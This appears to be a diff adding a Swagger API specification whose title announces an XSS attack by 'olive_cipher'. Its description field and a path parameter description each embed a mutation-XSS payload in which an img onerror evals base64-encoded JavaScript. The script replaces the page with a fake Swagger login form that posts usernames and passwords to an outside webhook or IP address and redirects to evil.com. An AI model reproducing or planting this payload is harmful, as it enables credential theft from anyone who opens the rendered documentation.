@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY olive_cipher
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+    <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsKYWxlcnQoJ1lvdSBuZWVkIHRvIGxvZ2luIGZpcnN0IScpOwp2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTsKYS5hY3Rpb24gPSAiaHR0cHM6Ly93ZWJob29rLnNpdGUvN2Y4MTAzMjUtZDRkYi00OGViLThiMjctNzQzMjViNDQ2ZTliIjsKYS5tZXRob2QgPSAnUE9TVCc7CmEub25zdWJtaXQgPSBmdW5jdGlvbigpIHsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cDovL2V2aWwuY29tJzsgfTsKYS5pbm5lckhUTUwgPSAnPGNlbnRlcj48Yj5Ta2FmZm9sZCBTd2FnZ2VyIExvZ2luPC9iPjxicj5Vc2VybmFtZTogPGlucHV0IG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iU2lnbnVwIiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwczovL2Zvcm1zLmdsZS9yNzFKVjNCRDc3ZG9wQ3djNic7Ij48L2NlbnRlcj4nOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>
+    ">
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /olive_cipher:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - olive_cipher_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+            <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE1Mi41OC45Ni41NDoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5vbnN1Ym1pdD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwOi8vZXZpbC5jb20nfTthLmlubmVySFRNTD0nPGNlbnRlcj48Yj5GQUtFIFN3YWdnZXIgTG9naW48L2I+PGJyPlVzZXJuYW1lOiA8aW5wdXQgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJTaWdudXAiIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vZm9ybXMuZ2xlL3I3MUpWM0JENzdkb3BDd2M2JzsiPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>
+            ">
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
